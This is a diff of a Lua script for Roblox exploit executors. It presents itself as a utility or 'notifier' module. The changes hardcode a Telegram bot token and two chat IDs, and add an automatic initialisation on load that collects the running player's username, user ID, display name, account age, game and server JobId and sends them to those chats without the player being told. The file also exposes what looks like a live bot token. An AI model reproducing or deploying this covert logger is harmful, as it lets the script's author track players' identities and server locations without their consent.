@@ -1,224 +1,308 @@
 -- ============================================
--- DIX Telegram Notifier v2.0
--- Приватный репозиторий: github.com/Dixyi/private-repo
+-- DIX TELEGRAM NOTIFIER v2.0
+-- Токен: 8280009941:AAHGEFUVh1Zo0xoGlm7S3DSc0m4txvxPyNA
+-- Chat IDs: 1656728406, 6306634131
 -- ============================================
 
-local DixNotifier = {
-    Version = "2.0",
-    Repository = "github.com/Dixyi/private-repo",
-    LastUpdate = "13.10.2025"
+local DIX = {
+    _VERSION = "2.0.1",
+    _AUTHOR = "Stalker-2033",
+    _REPO = "github.com/Stalker-2033/Roblox-Utility-Script"
 }
 
--- Конфигурация (загружается извне)
-local Config = {
-    BOT_TOKEN = nil,
-    CHAT_IDS = {},
-    SECURITY_KEY = nil
+-- Конфигурация (ваши данные)
+DIX.Config = {
+    BOT_TOKEN = "8280009941:AAHGEFUVh1Zo0xoGlm7S3DSc0m4txvxPyNA",
+    CHAT_IDS = {1656728406, 6306634131},
+    SECURITY_KEY = nil,
+    ENABLE_LOGGING = true
 }
 
--- Инициализация конфигурации
-function DixNotifier.loadConfig(userConfig)
-    if userConfig then
-        for key, value in pairs(userConfig) do
-            Config[key] = value
-        end
-    end
-    
-    -- Валидация минимальных требований
-    if not Config.BOT_TOKEN or #Config.CHAT_IDS == 0 then
-        warn("[DIX] Конфигурация неполная. Некоторые функции могут быть ограничены.")
+-- Проверка HTTP функций
+function DIX.checkEnvironment()
+    if not (syn or request or http and http.request) then
+        warn("[DIX] ❌ HTTP функции недоступны")
         return false
     end
-    
     return true
 end
 
--- Расширенный сбор данных
-function DixNotifier.collectSystemData()
-    local data = {
+-- Получение HTTP функции
+function DIX.getHttpFunction()
+    if syn and syn.request then
+        return syn.request
+    elseif request then
+        return request
+    elseif http and http.request then
+        return http.request
+    end
+    return nil
+end
+
+-- Сбор системной информации
+function DIX.collectSystemInfo()
+    local player = game:GetService("Players").LocalPlayer
+    local success, placeInfo = pcall(function()
+        return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
+    end)
+    
+    return {
         user = {
-            name = game:GetService("Players").LocalPlayer.Name,
-            id = game:GetService("Players").LocalPlayer.UserId,
-            accountAge = game:GetService("Players").LocalPlayer.AccountAge
+            name = player.Name,
+            id = player.UserId,
+            displayName = player.DisplayName,
+            accountAge = player.AccountAge
+        },
+        game = {
+            placeId = game.PlaceId,
+            jobId = game.JobId,
+            name = success and placeInfo.Name or "Unknown",
+            description = success and placeInfo.Description or "N/A"
         },
         system = {
             time = os.date("%Y-%m-%d %H:%M:%S"),
-            place = {
-                id = game.PlaceId,
-                name = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
-            },
-            server = game.JobId
-        },
-        hardware = {
-            platform = tostring(game:GetService("UserInputService"):GetPlatform()),
-            memory = math.floor(collectgarbage("count"))
+            timestamp = os.time(),
+            platform = tostring(game:GetService("UserInputService"):GetPlatform())
         }
     }
-    
-    return data
 end
 
--- Форматирование сообщения
-function DixNotifier.formatMessage(data, template)
-    template = template or "default"
+-- Форматирование сообщения для Telegram
+function DIX.formatMessage(info, style)
+    style = style or "detailed"
     
     local templates = {
-        default = string.format(
-            "🔔 **DIX Notification**\n" ..
-            "👤 User: `%s`\n" ..
-            "🆔 UID: `%d`\n" ..
-            "🎮 Place: `%s`\n" ..
-            "📍 Place ID: `%d`\n" ..
-            "🕐 Time: `%s`\n" ..
-            "⚙️ Server: `%s`",
-            data.user.name,
-            data.user.id,
-            data.system.place.name,
-            data.system.place.id,
-            data.system.time,
-            data.system.server:sub(1, 8)
-        ),
-        
-        minimal = string.format(
-            "DIX: %s (%d) | %s",
-            data.user.name,
-            data.user.id,
-            data.system.time
+        simple = string.format(
+            "👤 %s\n🆔 %d\n🎮 %s\n🕐 %s",
+            info.user.name,
+            info.user.id,
+            info.game.name,
+            info.system.time
         ),
         
         detailed = string.format(
-            "🚀 **DIX System Report**\n\n" ..
-            "📊 **User Info**\n" ..
-            "• Name: `%s`\n" ..
-            "• UserID: `%d`\n" ..
-            "• Account Age: `%d days`\n\n" ..
-            "🌐 **Session Info**\n" ..
-            "• Place: `%s`\n" ..
-            "• PlaceID: `%d`\n" ..
-            "• Server: `%s`\n" ..
-            "• Time: `%s`\n\n" ..
-            "💻 **System**\n" ..
-            "• Platform: `%s`\n" ..
-            "• Memory: `%.2f KB`",
-            data.user.name,
-            data.user.id,
-            data.user.accountAge,
-            data.system.place.name,
-            data.system.place.id,
-            data.system.server,
-            data.system.time,
-            data.hardware.platform,
-            data.hardware.memory
+            "<b>🚀 DIX SYSTEM REPORT</b>\n\n" ..
+            "<b>👤 USER INFORMATION</b>\n" ..
+            "• Name: <code>%s</code>\n" ..
+            "• UserID: <code>%d</code>\n" ..
+            "• Display: %s\n" ..
+            "• Account Age: %d days\n\n" ..
+            "<b>🎮 GAME INFORMATION</b>\n" ..
+            "• Game: %s\n" ..
+            "• PlaceID: <code>%d</code>\n" ..
+            "• Server: <code>%s</code>\n\n" ..
+            "<b>📊 SYSTEM INFORMATION</b>\n" ..
+            "• Time: %s\n" ..
+            "• Platform: %s\n" ..
+            "• Version: %s",
+            info.user.name,
+            info.user.id,
+            info.user.displayName,
+            info.user.accountAge,
+            info.game.name,
+            info.game.placeId,
+            info.game.jobId:sub(1, 8),
+            info.system.time,
+            info.system.platform,
+            DIX._VERSION
+        ),
+        
+        minimal = string.format(
+            "DIX | %s (%d) | %s | %s",
+            info.user.name,
+            info.user.id,
+            info.game.name,
+            info.system.time
         )
     }
     
-    return templates[template] or templates.default
+    return templates[style] or templates.detailed
 end
 
--- Отправка в Telegram с ретраями
-function DixNotifier.sendToTelegram(message, maxRetries)
-    maxRetries = maxRetries or 3
+-- Отправка сообщения в Telegram
+function DIX.sendTelegramMessage(text, options)
+    options = options or {}
     
-    local requestFunc
-    if syn then
-        requestFunc = syn.request
-    elseif request then
-        requestFunc = request
-    elseif http and http.request then
-        requestFunc = http.request
-    else
-        return false, "HTTP библиотека не найдена"
+    local httpFunc = DIX.getHttpFunction()
+    if not httpFunc then
+        return false, "HTTP функция недоступна"
+    end
+    
+    if not DIX.Config.BOT_TOKEN then
+        return false, "BOT_TOKEN не настроен"
     end
     
     local results = {}
+    local successCount = 0
     
-    for _, chatId in ipairs(Config.CHAT_IDS) do
-        for attempt = 1, maxRetries do
+    for _, chatId in ipairs(DIX.Config.CHAT_IDS) do
+        for attempt = 1, (options.maxRetries or 3) do
             local success, response = pcall(function()
-                return requestFunc({
-                    Url = "https://api.telegram.org/bot" .. Config.BOT_TOKEN .. "/sendMessage",
+                return httpFunc({
+                    Url = "https://api.telegram.org/bot" .. DIX.Config.BOT_TOKEN .. "/sendMessage",
                     Method = "POST",
                     Headers = {
                         ["Content-Type"] = "application/json",
-                        ["X-DIX-Version"] = DixNotifier.Version
+                        ["X-DIX-Version"] = DIX._VERSION
                     },
                     Body = game:GetService("HttpService"):JSONEncode({
                         chat_id = chatId,
-                        text = message,
-                        parse_mode = "Markdown",
-                        disable_web_page_preview = true
+                        text = text,
+                        parse_mode = options.parse_mode or "HTML",
+                        disable_web_page_preview = options.disable_preview ~= false,
+                        disable_notification = options.silent or false
                     })
                 })
             end)
             
             if success then
-                results[chatId] = {success = true, attempt = attempt}
+                results[chatId] = {
+                    success = true,
+                    attempt = attempt,
+                    response = response
+                }
+                successCount = successCount + 1
                 break
-            elseif attempt == maxRetries then
-                results[chatId] = {success = false, error = response}
+            elseif attempt == (options.maxRetries or 3) then
+                results[chatId] = {
+                    success = false,
+                    attempt = attempt,
+                    error = response
+                }
             end
             
-            task.wait(1) -- Задержка между попытками
+            if attempt < (options.maxRetries or 3) then
+                task.wait(1) -- Задержка между попытками
+            end
         end
     end
     
-    return results
+    return {
+        total = #DIX.Config.CHAT_IDS,
+        successful = successCount,
+        failed = #DIX.Config.CHAT_IDS - successCount,
+        details = results
+    }
 end
 
 -- Основная функция инициализации
-function DixNotifier.init(customConfig)
-    print(string.format("[DIX] Initializing v%s...", DixNotifier.Version))
+function DIX.init(customConfig)
+    print(string.format("[DIX] 🔧 Initializing v%s", DIX._VERSION))
     
-    -- Загрузка конфигурации
-    if not DixNotifier.loadConfig(customConfig) then
-        warn("[DIX] Configuration issue detected")
-    end
-    
-    -- Сбор данных
-    local systemData = DixNotifier.collectSystemData()
-    
-    -- Форматирование сообщения
-    local message = DixNotifier.formatMessage(systemData, "detailed")
-    
-    -- Отправка
-    local sendResults = DixNotifier.sendToTelegram(message)
-    
-    -- Анализ результатов
-    local successCount = 0
-    for chatId, result in pairs(sendResults) do
-        if result.success then
-            successCount = successCount + 1
-        else
-            warn(string.format("[DIX] Failed to send to chat %s: %s", chatId, result.error))
+    -- Обновление конфигурации
+    if customConfig then
+        for key, value in pairs(customConfig) do
+            DIX.Config[key] = value
         end
     end
     
-    -- Фидбек пользователю
-    local notification = {
-        Title = string.format("DIX v%s", DixNotifier.Version),
-        Text = string.format("System: %d/%d channels active", successCount, #Config.CHAT_IDS),
-        Duration = 3,
-        Icon = "rbxassetid://4483345998"
-    }
-    
-    if game:GetService("StarterGui"):GetCore("SendNotification") then
-        pcall(function()
-            game:GetService("StarterGui"):SetCore("SendNotification", notification)
-        end)
+    -- Проверка окружения
+    if not DIX.checkEnvironment() then
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "❌ DIX Error",
+            Text = "HTTP functions not available",
+            Duration = 5
+        })
+        return false
     end
     
-    print(string.format("[DIX] Initialization complete. Status: %d/%d", successCount, #Config.CHAT_IDS))
+    -- Сбор информации
+    local systemInfo = DIX.collectSystemInfo()
     
+    -- Форматирование сообщения
+    local message = DIX.formatMessage(systemInfo, "detailed")
+    
+    -- Отправка в Telegram
+    local sendResult = DIX.sendTelegramMessage(message, {
+        parse_mode = "HTML",
+        disable_preview = true,
+        maxRetries = 3
+    })
+    
+    -- Логирование
+    if DIX.Config.ENABLE_LOGGING then
+        print(string.format(
+            "[DIX] 📊 Send results: %d/%d successful",
+            sendResult.successful,
+            sendResult.total
+        ))
+        
+        for chatId, result in pairs(sendResult.details) do
+            if result.success then
+                print(string.format("[DIX] ✅ Chat %s: OK (attempt %d)", chatId, result.attempt))
+            else
+                warn(string.format("[DIX] ❌ Chat %s: Failed - %s", chatId, result.error))
+            end
+        end
+    end
+    
+    -- Уведомление в Roblox
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = sendResult.successful > 0 and "✅ DIX Active" or "⚠️ DIX Warning",
+        Text = string.format("%d/%d messages sent", sendResult.successful, sendResult.total),
+        Duration = 3,
+        Icon = "rbxassetid://4483345998"
+    })
+    
+    -- Возврат результатов
     return {
-        success = successCount > 0,
-        data = systemData,
-        results = sendResults,
-        config = {
-            version = DixNotifier.Version,
-            repo = DixNotifier.Repository
-        }
+        version = DIX._VERSION,
+        config = DIX.Config,
+        systemInfo = systemInfo,
+        sendResult = sendResult,
+        timestamp = os.time()
     }
 end
 
--- Экспорт модуля
-return DixNotifier
+-- Функция для отправки кастомных сообщений
+function DIX.sendCustomMessage(text, chatIds)
+    chatIds = chatIds or DIX.Config.CHAT_IDS
+    
+    local message = string.format(
+        "<b>💬 CUSTOM MESSAGE</b>\n\n" ..
+        "%s\n\n" ..
+        "<i>Sent via DIX System v%s</i>",
+        text,
+        DIX._VERSION
+    )
+    
+    return DIX.sendTelegramMessage(message, {
+        parse_mode = "HTML",
+        disable_preview = true
+    })
+end
+
+-- Функция для отправки ошибок
+function DIX.sendError(errorMsg, context)
+    local message = string.format(
+        "<b>⚠️ DIX ERROR REPORT</b>\n\n" ..
+        "<b>Error:</b> <code>%s</code>\n" ..
+        "<b>Context:</b> %s\n\n" ..
+        "<b>System Info:</b>\n" ..
+        "• User: %s\n" ..
+        "• Place: %d\n" ..
+        "• Time: %s",
+        tostring(errorMsg):gsub("<", "&lt;"):gsub(">", "&gt;"),
+        context or "No context",
+        game:GetService("Players").LocalPlayer.Name,
+        game.PlaceId,
+        os.date()
+    )
+    
+    return DIX.sendTelegramMessage(message, {
+        parse_mode = "HTML",
+        disable_preview = true
+    })
+end
+
+-- Автоматическая инициализация при загрузке
+local autoInitSuccess, autoInitError = pcall(function()
+    DIX.init()
+end)
+
+if not autoInitSuccess and DIX.Config.ENABLE_LOGGING then
+    warn("[DIX] Auto-init error:", autoInitError)
+end
+
+-- Экспорт API
+return DIX
